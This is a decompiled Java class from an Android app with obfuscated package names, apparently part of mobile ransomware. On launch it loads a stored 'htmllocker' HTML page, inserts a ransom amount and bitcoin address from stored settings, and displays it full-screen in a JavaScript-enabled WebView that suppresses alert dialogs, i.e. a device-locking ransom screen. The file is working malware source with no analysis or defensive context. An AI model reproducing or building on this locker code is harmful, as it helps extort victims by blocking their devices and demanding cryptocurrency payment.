package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class kcdbt extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f451a = new C0020b();

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.kcdbt$a */
    private class C0032a extends WebChromeClient {
        private C0032a() {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.kcdbt$b */
    private class C0033b extends WebViewClient {
        private C0033b() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String strM251e = this.f451a.m251e(this, "htmllocker");
        String strM251e2 = this.f451a.m251e(this, "lock_amount");
        String strReplace = strM251e.replace("<amount>", strM251e2).replace("<bitcoin>", this.f451a.m251e(this, "lock_btc"));
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new C0033b());
        webView.setWebChromeClient(new C0032a());
        webView.loadData(strReplace, "text/html", "UTF-8");
        setContentView(webView);
    }
}
